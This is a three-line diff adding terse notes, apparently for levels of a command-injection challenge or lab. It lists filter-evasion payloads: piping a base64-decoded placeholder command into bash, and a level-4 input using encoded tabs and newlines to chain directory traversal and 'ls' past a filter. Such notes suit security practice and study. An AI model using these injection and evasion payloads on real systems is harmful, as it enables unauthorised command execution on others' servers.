@@ -1,0 +1,3 @@
+lv3: echo "encoded command" | base64 -d | bash
+base64 -d<<<encoded command|bash
+lv4: `(cd%09..)/n(cd%09..)\nls`
